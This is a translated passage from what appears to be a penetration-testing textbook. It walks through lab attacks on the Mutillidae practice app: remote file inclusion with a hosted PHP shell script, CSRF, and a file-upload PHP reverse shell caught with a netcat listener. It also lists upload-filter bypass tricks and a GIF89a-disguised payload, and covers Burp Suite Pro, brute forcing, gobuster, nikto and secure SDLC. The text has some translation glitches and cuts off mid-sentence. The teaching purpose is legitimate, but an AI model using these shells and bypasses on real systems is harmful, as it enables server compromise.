  \n## 远程文件包含\n\n远程文件包含（RFI）的利用是通过能够加载托管在另一个 Web 服务器上的远程文件来实现的。为了实现这一目标，你需要能够通过类似的内容加载文件：\n\
  \n```\nhttp://[domain name]/page.php?file=[remote URL]/shell.php\n```\n\n让我们在 Mutillidae\
  \ 的以下 URL 上练习之前的模式：\n\n```\nhttp://localhost/mutillidae/index.php?page=arbitrary-file-inclusion.php\n\
  ```\n\n在利用它之前，我们需要在主机服务器上的 `php.ini` 文件中进行更改。在本例中，该文件位于 `/etc/php/7.4/apache2/php.ini`。打开该文件并确保具有以下值：\n\
  \n```\nAllow_url_fopen=On\nAllow_url_include=On\n```\n\n一旦你找到这两个变量，请确保保存文件。接下来，重启\
  \ Web 服务器：\n\n```\n$service apache2 restart\n```\n\n在这一阶段，让我们准备一个 PHP 脚本，允许我们执行\
  \ `ls` 命令。我们可以将 PHP 文件托管在我们的 Kali 宿主机上（确保 Web 服务器已启动）。在我们的 Kali 宿主机以下路径创建文件 `shell.txt`：`/var/www/html/shell.txt`。\n\
  \n```\nroot@kali:~# cd /var/www/html/\nroot@kali:/var/www/html# service apache2\
  \ start\nroot@kali:/var/www/html# echo \"<?php echo shell_exec(\"ls\");?>\"> shell.txt\n\
  ```\n\n太棒了！现在我们可以从 Mutillidae Web 服务器远程调用此脚本（参见图 8.28）：\n\n![Mutillidae 截图 – 远程文件包含。](img/c08f028.png)\n\
  \n图 8.28 Mutillidae – 远程文件包含\n\n```\nKali IP: 172.16.0.102\nMutillidae Ubuntu 宿主机\
  \ IP: 172.16.0.107\n```\n\n在此阶段，你可以将 `ls` 命令替换为与远程服务器兼容的远程 脚本（例如 Python、Perl 等）。\n\
  \n## 跨站请求伪造\n\n跨站请求伪造（CSRF）的利用是利用用户的会话来代表他们执行 POST 表单请求。CSRF（有些人读音为“sea surf”）在博客或社交媒体上可能非常有效。为了让此利用生效，攻击者需要说服受害者点击恶意链接，以劫持其会话并执行恶意交易（例如转账）。\n\
  \n在我们继续示例之前，你应该学习一些基础知识，以便能够测试 CSRF 漏洞。当用户登录网站时，会为该人员创建一个唯一的会话 Cookie（session cookie）。其次，该会话\
  \ Cookie 在过期之前将保持激活状态，即使你切换到另一个站点也是。\n\n对于这个示例，我们将再次使用 Mutillidae Web 应用程序的博客页面（参见图\
  \ 8.29）：\n\n```\nhttp://[IP address]/mutillidae/index.php?page=add-to-your-blog.php\n\
  ```\n\n![Mutillidae 博客页面截图。](img/c08f029.png)\n\n图 8.29 Mutillidae 博客页面\n\n让我们进一步推进这种攻击并在真实场景中将其视觉化。攻击者\
  \ Elliot 想要入侵他来自 KCorp 的受害者 Angela。让我们看看实际操作。\n\n### 攻击者场景\n\nElliot 将分析页面内容并确定此博客容易受到\
  \ CSRF 攻击。接下来，他将构建一个恶意页面来感染 Angela。为了完成任务，Elliot 将使用 `Burp Suite` 拦截页面请求，然后右键点击尝试生成\
  \ CSRF PoC，如图 8.30\n\n图 8.30 Burp Suite – 生成 CSRF\n\n一旦他点击按钮，就会弹出一个窗口。接下来，Elliot\
  \ 将复制生成的代码并将 HTML 保存到其 Kali 宿主机上的一个文件中：\n\n```\n/var/www/html/csrf.html\n```\n\n\
  然后，Elliot 将链接通过电子邮件发送给受害者：\n\n```\nhttp://172.16.0.102/csrf.html\n```\n\n一旦她点击该链接，它将在另一个浏览器中打开博客。\n\
  \n### 受害者场景\n\n现在轮到 Angela 接收邮件了。在这个示例中，我们将使用 Mutillidae 博客页面。一旦她执行操作，页面将显示博客页面的状态。\n\
  \n![Mutillidae 博客页面截图。](img/c08f031.png)\n\n图 8.31 Mutillidae 博客页面\n\n注意攻击者使用的是免费版本的\
  \ Burp Suite。一旦她点击按钮，将被重定向到\n\n## 文件上传\n\n文件上传漏洞的利用是通过能够向目标服务器上传恶意文件来实现的。在实践中，目标是能够上传可以在执行的\
  \ webshell。Web 服务器支持多种语言。\n\n### 简单文件上传\n\n在本示例中，我们将使用 Mutillidae 上传 webshell，安全级别设置为零。也就是说，我们应该能够上传任何类型的文件。\n\
  \n开始之前，访问 Mutillidae 中的文件上传页面，如图 8.34 所示：\n\n```\nhttp://[IP address]/mutillidae/index.php?page=upload-file.php```\n\
  \n![Mutillidae 文件上传截图。](img/c08f034.png)\n\n图 8.34 Mutillidae 文件上传\n\n在攻击者宿主机上，拷贝\
  \ Kali 预装的 PHP webshell：\n\n```\nroot@kali:~# cp /usr/share/laudanum/php/php-reverse-shell.php\
  \ /root/Documents\n```\n\n接下来，编辑文件并确保包含我们 Kali 宿主机的 IP 地址以及想要监听的端口号：\n\n```php\n\
  $ip = '172.16.0.102'; // 修改此处\n$port = 2222; // 修改此处\n```\n\n保存文件后，使用 `netcat` 启动监听器：\n\
  \n```\nroot@kali:~/Documents# nc -nlvp 2222\nlistening on [any] 2222 …\n```\n\n\
  在此阶段，我们已准备好感染目标服务器。回到 Mutillidae 文件上传页面并尝试上传 webshell 文件。一旦上传完成，页面将显示上传状态，如图 8.35\
  \ 所示。\n\n太棒了！接下来，更改 URL 并指向新的 PHP 文件：\n\n\n\n\n```\n http://[IP address]/mutillidae/index.php?page=/tmp/php-reverse-shell.php\n\
  ```\n\n![Mutillidae – 文件上传结果截图。](img/c08f035.png)\n\n图 8.35 Mutillidae – 文件上传结果\n\
  \n一旦我们访问恶意 URL，回到终端窗口，你会发现我们有了一个远程 shell：\n\n```\n root@kali:~/Documents# nc -nlvp\
  \ 2222\nlistening on [any] 2222 …\nconnect to [172.16.0.102] from (UNKNOWN) [172.16.0.107]\
  \ 57374\nLinux ubuntu 5.4.0-40-generic #44-Ubuntu SMP Tue Jun 23 00:01:04 UTC 2020\
  \ x86_64 x86_64 x86_64 GNU/Linux\n 09:48:20 up 6 days, 18:30, 1 user, load average:\
  \ 0.00, 0.00, 0.00\nUSER     TTY     FROM      LOGIN@  IDLE  JCPU  PCPU  WHAT\n\
  gus      :0      :0        03Jul20 ?xdm? 48:23 0.00s /usr/lib/gdm3/gdm-x-session\
  \ --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --systemd\
  \ --session=ubuntu\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n/bin/sh:\
  \ 0: can't access tty; job control turned off\n$ pwd\n/\n$\n```\n\n### 绕过验证\n\n\
  在上例中，我们没有任何防护，PHP 反向 shell 成功上传。强化文件上传的方法有很多，绕过这种保护的方法也有。在本示例中，你将看到如何绕过文件扩展名保护。在这种情况下，开发者将阻止上传不需要的扩展名。例如，只允许上传图片。如果是这样，我们只需要在\
  \ Burp Suite 中拦截请求（参见图 8.36）并进行相应的修改。我们将继续使用 Mutillidae 中的相同上传页面，但这次我们将上传一张普通图片。在此阶段，我们不希望\
  \ JavaScript 验证阻止我们上传 shell。\n\n![文件上传 POST 数据截图。](img/c08f036.png)\n\n图 8.36 文件上传\
  \ POST 数据\n\n接下来，我们将对之前的 Web 请求进行以下更改，如图 8.37 所示：\n\n1. 将文件名从 `photo.png` 重命名为 `photo.php.png`。\n\
  2. 确保内容类型（content type）保持为 `image/png`。\n3. 将图片内容改为我们简单的 PHP 负载。\n\n![文件上传 POST\
  \ 数据有效负载截图。](img/c08f037.png)\n\n图 8.37 文件上传 POST 数据有效负载\n\n#### 文件重命名\n\n应用程序通过检查扩展名值来阻止用户上传类似\
  \ `shell.php` 的文件。在上例中，我们保留了最后的扩展名 `.png`，并在之前插入了 `.php`，这样验证方法就不会检测到它。这里是一些你可以用于此类绕过的小技巧：\n\
  \n*   Apache Web 服务器允许执行双重扩展名文件（例如 `shell.php.png`）。\n*   在 IIS `6`（以及之前的版本）中，你可以在最终扩展名之前添加分号（例如\
  \ `shell.asp;.png`）。\n*   可以通过操控扩展名字符的大小写来绕过大小敏感规则。这里是一些示例：\n    * `Shell.pHP`\n\
  \    * `Shell.php3`\n    * `Shell.ASP`\n* 另一个技巧是在最终扩展名之前添加空字节（（十六进制的 `00`）。例如，使用\
  \ `shell.php%00.png`。\n\n![Burp Suite – 拦截 Hex 标签截图。](img/c08f038.png)\n\n图 8.38\
  \ Burp Suite – 拦截 Hex 标签\n\n#### 内容类型\n\n内容类型是将文件上传到远程服务器时的另一个重要因素。开发者可能已经在前端/后端添加了验证来检查文件的内容类型。务必确保内容类型与服务器期望的文件类型匹配。\n\
  \n#### 负载内容（Payload Contents）\n\n仔细观察我们在示例中使用的负载开头（参见图 8.37 *此处引用可能有误*），如下所示：\n\n\
  ```\n GIF89a;\n<?php system('ls -la');?>\n```\n\n你可能在想：“`GIF89a;` 是什么用的？”这是一个头部签名，会欺骗服务器认为我们的文件是一个合法的图像。为了测试我们的想法，将负载保存到文本文件中，命名为\
  \ `payload.txt`，并使用 `file` 命令检查其类型：\n\n```\n root@ubuntu:~# file payload.txt \n\
  payload.txt: GIF image data, version 89a, 2619 x 16188\n```\n\n#### 编码\n\n在某些情况下，你会遇到一些后端具有基础防护的网站，它们会阻止不需要的字符（上传、XSS、命令注入等）。如果是这样，尝试使用编码。如果你正尝试在\
  \ URL 查询字符串中注入负载，请使用 URL 编码。如果在表单中，则使用 HTML 编码。为了实现这一点，我们的朋友 Burp Suite 会派上场，因为有一个专门为此目的设计的\
  \ Decoder 标签页，如图 8.39 所示。\n\n![Burp Suite – 拦截 Hex 标签截图。](img/c08f039.png)\n\n图\
  \ 8.39 Burp Suite – 拦截 Hex 标签\n\n\n\n\n\n* Web 应用程序枚举工具\n* Web 应用程序手动渗透测试清单\n* 安全软件开发生命周期\n\
  \n## Web 枚举与利用\n\nBurp Suite 是你工具箱中不可或的优秀工具！它允许你发现大量的 Web 应用程序漏洞，如果你想成为一名 Web 渗透测试员或赏金猎人，那么这个工具是必不可少的。本节介绍\
  \ Burp Suite 的专业版，它不是免费的。\n\n### Burp Suite Pro\n\n用简单的一句话来总结这个工具：Burp Suite 允许你使用\
  \ `proxy` 来拦截和修改 Web 请求与响应。该工具可以扫描基于 Web 应用程序的漏洞等功能（它不仅仅是一个工具；它是一头猛兽）。Burp Suite\
  \ 有不同的标签页和功能，让我们来看看每个标签页可以做什么。\n\n#### 使用 Burp Suite 进行 Web 渗透测试\n\n没有什么比一个真实的渗透测试示例更能向你展示\
  \ `Burp Suite Pro` 内部的所有功能了。在这个示例中，你将学习以下内容：\n\n* 如何运行 Burp Suite Pro\n* 理解 `proxy`\n\
  * 如何使用 `target` 标签\n* 理解 `repeater`\n* 如何使用 `intruder`\n* 利用 `Extender` 应用商店\n\n\
  ##### 加载 Burp Suite Pro\n\n在此示例中，我们将使用 Mutillidae Web 应用程序并用 `Burp` 对其进行扫描。要启动此工具，请从你的\
  \ [portswigger.net/](http://portswigger.net/) 账户下载 Pro 版 `JAR` 文件。使用以下命令运行工具：\n\n\
  ```\njava – jar [burp suite file name.jar]\n```\n\n一旦 `Burp` 启动，你将遇到两个窗口，允许执行以下操作：\n\
  \n* 在开始之前将项目保存到磁盘\n* 创建不保存到磁盘的临时项目\n* 打开已保存的项目\n* 加载自定义的 Burp Suite 配置文件\n\n在切换到浏览器之前，点击\
  \ `Proxy` 标签页并点击 `Intercept Is On` 按钮禁用拦截器。注意，`Burp` 将继续在后台监听 Web 请求/响应。\n\n在你的\
  \ Web 浏览器中，确保更改以下项：\n\n1. 更改浏览器设置并将 `proxy` 设置为端口 `8080`（我们已经在 第 6 章，“高级枚举阶段”中介绍过如何操作）。\n\
  2. 确保浏览器包含 Burp Suite HTTPS 证书。它需要信任此证书以拦截 HTTPS 通信。为此，在浏览器中输入 URL `http://burp`\
  \ 并点击 `CA Certificate` 按钮下载（参见 图 9.1）。![Burp Suite 证书截图。](img/c09f001.png)\n\n图\
  \ 9.1 Burp Suite 证书\n\n一旦下载了证书，打开浏览器并选择 设置（Preferences）➪ 隐私与安全（Privacy & Security）➪\
  \ 证书（Certificates）➪ 查看证书（View Certificates）➪ 导入（Import）。\n\n当你点击 `Import` 时，它会要求你选择证书文件（在你的下载文件夹中）。接下来，确保勾选两个选择框（参见\
  \ 图 9.2）以信任上传的 CA 证书；最后，点击 `OK`。\n\n![导入 Burp Suite 证书的截图。](img/c09f002.png)\n\n\
  图 9.2 导入 Burp Suite 证书\n\n#### Burp Proxy\n\n当启动 Burp Suite 时，请考虑以下因素：\n\n* `intercept`\
  \ 按钮默认被选中，除非你想停止向 Web 服务器发送每一个请求/响应，否则你需要关闭它。注意，工具会在后台保存所有通信（在 `Proxy` 标签页上有一个对应的\
  \ `HTTP History` 子标签页）。\n* 在 `Options` 部分（参见 图 9.3），你通常会更改三个三个设置：\n    * 更改监听端口号（默认是\
  \ `8080`）\n    * 拦截 Web 请求（默认启用）\n    * 拦截从服务器返回的 Web 响应（默认禁用）![Burp Suite Proxy\
  \ 标签页，Options 部分截图。](img/c09f003.png)\n\n图 9.3 Burp Suite Proxy 标签页，Options 部分\n\
  \n##### Target 标签\n\n现在是可以在 `intercept` 按钮禁用的情况下开始浏览 Mutillidae 应用程序中的所有 Web 页面。完成后，点击\
  \ `Target` 标签页以可视化你尝试测试的域名。\n\n在 `Site Map` 子标签页上，你可以看到 Burp Suite 已经检测到 Mutillidae\
  \ 的结构（参见 图 9.4）。在此部分中，你可以可视化这些站点项目：HTML 页面、图像、文件夹、JavaScript 等。接下来，在它的左侧，你可以选择历史条目以阅读下方的请求/响应详情（在显示\
  \ `Request` 和 `Response` 标签页的窗口中）。在屏幕的最右侧，Burp Suite 会被动识别任何安全问题，在右下角，你可以看到所选问题的详细信息（稍后当你运行漏洞扫描器时，漏洞也会列在这里）。\n\
  \n![Burp Suite target 截图。](img/c09f004.png)\n\n图 9.4 Burp Suite Target\n\n在此阶段，配置\
  \ Burp Suite 将 Mutillidae 包含在范围内；换句话说，你不希望它扫描之前检测到的其他域名。要将 URL 添加到范围，右键点击域名的根节点（在我的案例中，根项目是\
  \ [`172.16.0.107`](http://172.16.0.107)），然后点击 `Add To Scope` 菜单项（参见 图 9.5）。\n\n\
  ![Burp Suite Add To Scope 选项截图。](img/c09f005.png)\n\n图 9.5 Burp Suite Add To Scope\n\
  \n接下来，点击 `filter` 按钮（显示“Filter: Hiding not found items”的地方）并选择 `Show Only In Scope`\
  \ 复选框（参见 图 9.6）。\n\n![Burp Suite filter 截图。](img/c09f006.png)\n\n图 9.6 Burp Suite\
  \ In Filter\n\n要隐藏此屏幕，只需点击它之外任何地方，你将看到 `Site Map` 标签页中的所有范围外项目都消失了（参见 图 9.7），仅保留\
  \ Mutillidae）。\n\n![应用 Burp Suite 范围过滤截图。](img/c09f007.png)\n\n图 9.7 Burp Suite\
  \ In-scope Filter\n\n##### 枚举项目（爬虫/内容发现）\n\n在开始此部分之前，你需要知道 Burp Suite 需要大量的内存才能运行，否则你将在过程中遇到运行时错误。\n\
  \n在此阶段，Burp Suite 在我们手动浏览期间已经发现了一些项目（它们是灰色的）。接下来，运行 `Discover Content` 来扫描更多项目。右键点击\
  \ Mutillidae 树的 IP 地址（根项目），选择 `Engagement Tools` ➪ `Discover Content`（参见 图 9.8）。\n\
  \n![Burp Suite Discover Content 菜单项截图。](img/c09f008.png)\n\n图 9.8 Burp Suite Discover\
  \ Content Menu Item\n\n一旦内容发现窗口打开，点击 `Config` 标签添加适当配置。在此部分中，将子目录的最大深度设置为 `2` 以更快完成任务。通常，当我在实际任务中运行\
  \ Burp Suite 时，我会选择以下选项（取决于网站结构）：\n\n* Max Depth: `5`\n* Number Of Discovery Threads:\
  \ `4`\n* Number Of Spider Threads: `4`\n\n接下来，选择 `Control` 标签并点击 `Session Is Not\
  \ Running` 来执行 Burp Suite（参见 图 9.9）。\n\n此任务需要几个小时才能完成（取决于网站结构）。当没有更多队列任务时，点击 `Session\
  \ Is Running` 按钮停止爬虫，并返回 `Site Map` 标签页检查结果。\n\n##### 自动漏洞扫描\n\n\n\n\n\n现在是时候在 Mutillidae\
  \ 中寻找一些漏洞了。Burp Suite Pro 拥有一个可以发现缺陷的内部扫描器。要完成工作，在 `Site Map` 标签页中右键点击根域名，并选择 `Actively\
  \ Scan This Host`。接下来，选择 `Dashboard` 标签以可视化扫描结果的进度（参见图 9.10）。\n\n![Burp Suite 运行\
  \ Discover Content 功能的截图。](img/c09f009.png)\n\n图 9.9 Burp Suite 运行 Discover Content\
  \ 功能\n\n![Burp Suite 主动扫描的截图。](img/c09f010.png)\n\n图 9.10 Burp Suite 主动扫描\n\n###\
  \ Repeater 标签\n\n当你想要在将负载发送到 Web 服务器之前手动注入负载时，这个标签非常有用。负载可以是你选择的任何类型的输入，因此你可以尝试验证\
  \ Web 服务器将如何响应。大多数情况下，你可以启用拦截，然后在拦截窗口中右键点击请求并从菜单中点击 `Send To Repeater`（参见图 9.11）。\n\
  \n![Burp Suite Send To Repeater 菜单项的截图。](img/c09f011.png)\n\n图 9.11 Burp Suite Send\
  \ To Repeater 菜单项\n\n一旦请求进入 `Repeater` 标签，你就可以以你任何想要对其进行操纵。在这个示例中，我们将把 `cookie header`\
  \ 中的 `UID` 值更改为 `1` 并观察响应。点击 `Send` 后，响应头将指示你正以 admin 身份登录（参见图 9.12）。\n\n![更改 UID\
  \ 参数的截图。](img/c09f012.png)\n\n图 9.12 更改 UID 参数\n\n### Intruder 标签\n\n`Intruder`\
  \ 标签允许你对发送到 Web 服务器的 Web 请求进行模糊测试（fuzz）和自动化。你可以使用 intruder 执行很多任务，包括：\n\n*   暴力破解登录页面\n\
  *   枚举用户名\n*   枚举任何 `UID` 类型（例如 `AccountID`、`ProductID`、`EmployeeID` 等）\n*   手动爬取（查找网页、目录、文件等）\n\
  *   通过模糊测试寻找漏洞（例如 `SQLi`、`XSS`、`LFI` 等）\n\n现在你已经知道可以使用 `Intruder` 标签做什么，下一个挑战是理解各种攻击类型：\n\
  \n*   **Sniper（狙击）**：这种攻击类型使用单个负载。有很多可以使用 sniper 方法的示例（例如枚举用户名、`UID`、查找文件/目录等）。\n\
  *   **Battering ram（撞击）**：这种攻击类型允许你使用一个负载。在 battering ram 类型中，你可以将相同的负载插入到 Web 请求的多个区域（例如将相同的负载插入到\
  \ `URL` 和 Web 请求头中）。\n*   **Cluster bomb（集群炸）**：这种类型允许你向 Web 请求中插入多个*不相关*的负载（最多\
  \ 20 个）。一个很好的例子是登录页面暴力破解；在这种情况下，你需要插入两个不同的负载：一个用于用户名，一个用于密码。\n*   **Pitchfork（叉叉）**：这种允许你向\
  \ Web 请求中插入多个*相关*的负载（我很少使用这种攻击类型）。一个实际示例是对员工姓名及其在另一个字段中相关的 `UID` 进行模糊测试。\n\n让我们来看一个使用\
  \ Burp Suite 的 `Intruder` 标签暴力破解 Mutillidae 登录页面的实际示例。要完成工作，将登录页面提交到 Burp Suite（在本示例中，用户名输入\
  \ `admin`，密码输入 `password123`），并使用 `Proxy` 部分对其进行拦截。一旦拦截了 Web 请求，右键点击并从菜单中选择 `Send\
  \ To Intruder`。\n\n在 `Intruder` 标签上，确保选择了 `Positions` 子标签（参见图 9.13）。\n\n![Burp Suite\
  \ Intruder Positions 子标签的截图。](img/c09f013.png)\n\n图 9.13 Burp Suite Intruder Positions\
  \ 子标签\n\n默认情况下选中了 sniper 攻击类型，Burp Suite 已经识别了插入点。在本示例中，暴力破解 admin 用户名（静态）并从字典文件中加载密码（变量负载）。换句话说，你只需要一个负载，即密码值。接下来，选择\
  \ `Sniper` 攻击类型（保持不变，因为它已经被选中）并点击 `Clear` 移除所有插入点。要选择负载，高亮 `password123` 值并点击 `Add`\
  \ 以插入你的变量（参见图 9.14）。\n\n![Burp Suite Intruder Payload 的截图。](img/c09f014.png)\n\n\
  图 9.14 Burp Suite Intruder Payload\n\n在 `Intruder` 标签上，确保选择了 `Positions` 子标签。选择\
  \ `Sniper` 攻击类型并点击 `Clear` 移除所有插入点。要选择负载，高亮 `password123` 值并点击 `Add` 以插入你的变量。接下来，切换到\
  \ `Payloads` 标签，将 `Payload type` 选择为 `list attack`。点击 `Load` 选择你的字典文件。一旦负载加载，你就需要开始攻击。最后，点击\
  \ `Start` 按钮开始攻击（参见图 9.15）。\n\n当攻击开始时，将打开一个新窗口显示进度。要在 Burp Suite 中创建报告，你必须处于 `Site\
  \ Map` 标签页并选择根域名项（在我的示例中，它是 Mutillidae 服务器的 IP 地址）。接下来，右键点击，从菜单中选择 `Issues`（参见图\
  \ 9.19），并点击 `Report Issues For This Host`。\n\n\n\n\n一旦点击菜单项，将弹出一个新的弹出窗口。在此阶段，你将按照向导中的步骤进行操作。完成后，Burp\
  \ 将生成一份精美的 HTML 报告（参见图 9.20）。\n\n![Burp Suite 报告示例截图](img/c09f020.png)\n\n图 9.20\
  \ Burp Suite 报告示例\n\nBurp 将漏洞严重程度分为高（High）、中（Medium）、低（Low）和信息（Information）。这个工具的棒之处在于，它提供了每个漏洞的置信水平（误报概率）。在此阶段，你的角色是测试每个漏洞，并确保你没有报告误报。换句话说，不要在没有验证的情况下直接复制报告发送给你的雇主/客户。（要验证误报，你可以使用\
  \ Burp 中的 `Repeater` 标签页重现 Web 请求并测试注入的负载。）\n\n### 更多枚举\n\n对于 Web 应用程序，枚举阶段与其他 TCP\
  \ 协议略有不同。在本节中，你将获得用于枚举 Web 应用程序的工具总结。在此阶段，我们的是实现以下任务：\n\n*   （第二次）爬取 Web 服务器上的文件\n\
  *   识别 Web 服务器版本是否过旧并存在严重漏洞\n*   检测任何可能导致你访问未授权资源的缺失配置\n\n#### Nmap\n\n在枚举时，从 `Nmap`\
  \ 开始是一个好主意。我们可以使用之前在本书中见过的脚本引擎：\n\n```\n$nmap -sV -p 80 -sC [IP address]\n```\n\n\
  #### 爬取\n\n爬取是识别 Web 服务器内部隐藏内容的重要步骤。人们经常在生产环境中部署不必要的配置文件和密钥。用于此目的的一个绝佳工具是 `GoBuster`（你可以将此工具配合\
  \ `Burp Crawler` 使用，以双检是否遗漏了任何隐藏点）：\n\n```\nroot@kali:~# gobuster dir ‐u http://172.16.0.107/mutillidae/\
  \ ‐w /usr/share/wordlists/dirbuster/directory‐list‐2.3‐medium.txt ‐e ‐t 25\n===============================================================\n\
  Gobuster v3.0.1\n[…]\n=======================================================\n\
  2020/08/12 08:04:37 Starting gobuster\n=======================================================\n\
  http://172.16.0.107/mutillidae/documentation (Status: 301)\nhttp://172.16.0.107/mutillidae/ajax\
  \ (Status: 301)\nhttp://172.16.0.107/mutillidae/test (Status: 301)\nhttp://172.16.0.107/mutillidae/includes\
  \ (Status: 301)\nhttp://172.16.0.107/mutillidae/javascript (Status: 301)\nhttp://172.16.0.107/mutillidae/classes\
  \ (Status: 301)\nhttp://172.16.0.107/mutillidae/styles (Status: 301)\nhttp://172.16.0.107/mutillidae/webservices\
  \ (Status: 301)\nhttp://172.16.0.107/mutillidae/images (Status: 301)\nhttp://172.16.0.107/mutillidae/passwords\
  \ (Status: 301)\nhttp://172.16.0.107/mutillidae/configuration (Status: 301)\nhttp://172.16.0.107/mutillidae/phpmyadmin\
  \ (Status: 301)\n========================================================\n2020/08/12\
  \ 08:04:51 Finished\n```\n\n注意，Kali Linux 默认没有安装 `GoBuster`。要安装它，你需要执行 `apt` 命令：\n\
  \n```\n$apt install gobuster -y\n```\n\n#### 漏洞扫描\n\n要发现中间件（Web 服务器）中的漏洞，你需要运行漏洞扫描器。你已经在第\
  \ 7 章“漏洞利用阶段”中学习了如何使用 `OpenVAS` 扫描漏洞。在本节中，你将学习另一个可以扫描 Web 应用程序漏洞的快速工具，它被称为 `Nikto`：\n\
  \n```\nroot@kali:~# nikto -host http://172.16.0.107/mutillidae/\n- Nikto v2.1.6\n\
  ---------------------------------------------------------------------------\n+ Target\
  \ IP:         172.16.0.107\n+ Target Hostname:   172.16.0.107\n+ Target Port:  \
  \     80\n+ Start Time:        2020-08-12 08:15:56 (GMT-4)\n---------------------------------------------------------------------------\n\
  + Server: Apache/2.4.41 (Ubuntu)\n+ Cookie PHPSESSID created without the httponly\
  \ flag\n+ Cookie showhints created without the httponly flag\n+ The anti-clickjacking\
  \ X-Frame-Options header is not present.\n+ X-XSS-Protection header has been set\
  \ to disable XSS Protection. There is unlikely to be a good reason for this.\n+\
  \ Uncommon header 'logged-in-user' found, with contents: \n+ The X-Content-Type-Options\
  \ header is not set. This could allow the user agent to render the content of the\
  \ site in a different fashion to the MIME type\n+ No CGI Directories found (use\
  \ '-C all' to force check all possible dirs)\n+ \"robots.txt\" contains 8 entries\
  \ which should be manually viewed.\n+ OSVDB-630: The web server may reveal its internal\
  \ or real IP in the Location header via a request to /images over HTTP/1.0\\. The\
  \ value is \"127.0.1.1\".\n+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD \n+\
  \ Web Server returns a valid response with junk HTTP methods, this may cause false\
  \ positives.\n+ DEBUG HTTP verb may show server debugging information. See http://msdn.com\n\
  ```\n\n\n\n\n*   你是否可以通过使用未注册的用户进行登录来列举用户名？\n\n## 用户注册\n\n注册用户将允许你登录门户并探索内部内容。\n\
  \n*   使用现有用户进行注册并检查错误信息（这将允许你列举用户）。\n*   使用弱密码进行注册。\n*   测试 SQL 注入（记住，此表单会在数据库中创建新的用户记录）。\n\
  \n## 重置/更改密码\n\n这是另一个与后端用户记录交互的有趣表单。请手动检查以下项目：\n\n*   尝试重置现有用户，以理解密码重置的工作流。\n* \
  \  你是否可以更改他人的密码吗？\n*   如果系统生成了随机临时密码，请检查以下内容：\n    * 密码的复杂度。\n    * 它的有效期（超时过期）。\n\
  \    * 系统是否强制用户在首次登录后更改密码？\n\n## 安全软件开发生命周期\n\n每个 Web/移动应用程序在部署到生产环境之前都会经过不同的阶段。这是应用程序安全和渗透测试中的一个重要课题。大公司管理的不仅仅是一个应用程序；有时超过\
  \ 100 个。这并非夸张；事实上，在企业环境中这是很常的。请注意，本节面向在公司工作的全职渗透测试员（员工或顾问），他们负责从头到尾监督项目。\n\n图 9.21\
  \ 显示了典型项目在软件开发生命周期（SDLC）每个阶段经历的步骤。\n\n![软件开发生命周期示意图。](img/c09f021.png)\n\n图 9.21\
  \ 软件开发生命周期\n\n在本节中，你将学习安全分析师在 SDL（开发生命周期）每个阶段的角色和职责。该过程的目的是将其转换为安全的软件开发生命周期（SSDL）。一图胜千万言，因此\
  \ 图 9.22 显示了 SSDL 的总结。\n\n![安全开发生命周期示意图。](img/c09f022.png)\n\n图 9.22 安全开发生命周期\n\n\
  ### 分析/架构阶段\n\n在此阶段，项目还处于初期阶段，每个人都在为业务案例奠定基础。作为安全专业人员，你将参加启动会议，在开发产品之前提前理解并为（项目团队成员）提供必要的建议。这是你开始为随后的测试做计划，并为后期阶段实施安全工具做准备的地方。谈到计划，最好提前准备安全架构文档（例如，威胁建模）（请参见下一节了解如何准备应用程序威胁建模文档）。\n\
  \n#### 应用程序威胁建模\n\n应用程序威胁建模允许你分析应用程序的态势，并在项目后期开始安全测试之前设计攻击场景。应用程序威胁建模文档主要包含以下部分：\n\
  \n*   资产\n*   入口点\n*   第三方\n*   信任级别\n*   数据流图 (DFD)\n\n在继续后续章节之前，你需要问自己以下问题（以正确评估项目）：\n\
  \n*   该应用程序是对互联网可见的，还是仅对内网可见？\n*   应用程序是否存储了机密数据（例如，个人身份信息，即 `PII`）？\n*   应用程序是如何使用的（例如，它仅仅是一个\
  \ Web 应用吗）？\n*   是否存在任何第三方实体（例如，云服务或外部提供商）？\n*   你有基础设施架构图吗？（如果没有，请索要。）\n\n####\
  \ 资产\n\n资产是攻击者（黑客）想要窃取的物品。最明显的例子是机密数据，如信用卡、保险单号、客户个人信息等（`PII`）。总而言之，这里是黑客可以利用的基础资产列表，你在处理此部分时应该考虑它们：\n\
  \n*   网络设备\n*   主机服务器\n*   中间件\n*   应用层（Web/移动）\n\n#### 入口点\n\n顾顾名，入口点是攻击者与资产交互的入口。请记住，资产不仅是\
  \ Web 应用程序，也可以数据库或主机本身（或虚拟机/容器等）。\n\n#### 第三方\n\n在此节中，你列出应用程序将与之交互的第三方项目。常见的例子是云，如\
  \ `Microsoft Azure` 或 `Amazon Web Services` (`AWS`) 等。\n\n#### 信任级别\n\n在识别出所有资产组件（包括第三方项目）后，你必须检查每一个的身份验证/授权。例如，恶意管理员（内部人员）在某些记录未加密的情况下读取客户的机密数据。\n\
  \n#### 数据流图\n\n网络图将直观地显示你到为止收集的所有内容。例如（参见 图 9.23 中的网络图），我们的公司有一个网站和一个移动应用。数据由独立的\
  \ Web API 服务器消耗，并最终存储在数据库中。\n\n你可以通过数据流图 (`DFD`) 简化上述网络图，将所有组件整合可视化（参见 图 9.24）。\n\
  \n#### 开发阶段\n\n在此阶段，项目已通过（架构通过）并进入开发阶段。这是使用 `C#`、`.NET`、`Java`、`Swift` 等编程语言开发网站或移动应用功能的阶段。\n\
  \n![网络图示意图。](img/c09f023.png)\n\n图 9.23 网络图\n\n![数据流图示意图。](img/c09f024.png)\n\n\
  图 9.24 数据流图\n\n在开发阶段，团队将使用构建服务器，如 `Jenkins` 或 `TFS`（现在 `TFS` 称为 `Azure DevOps`）。该构建服务器将编排项目源代码；因此，我们有了持续集成\
  \ (`CI`) 和持续部署 (`CD`)。在开发阶段，你必须确保以下几点：\n\n*   使用静态安全测试 (`SAST`) 自动化工具（例如，`Veracode`、`Checkmarx`\
  \ 等）定期扫描源代码。`SAST` 扫描器会在代码提交到构建服务器后发现源码中的安全漏洞。你必须强制项目养成这种良好习惯，以便他们在产品开发初期就能发现问题。\n\
  *   人工代码审查是至关重要的，因为自动化工具无法覆盖 100% 的源代码。在完成一个新功能（开发人员）后，你必须执行这一步骤。\n*   大多数时候，源代码使用开源第三方库（目标是为应用程序更多功能）。在这种情况下，你的职责是检查以下三项：\n\
  \    * 库是否包含任何漏洞？\n    * 它是否是最新版本？\n    * 它是否可以商业用途？\n\n为了完成这项工作，有一些自动化扫描器（例如 `Sonatype\
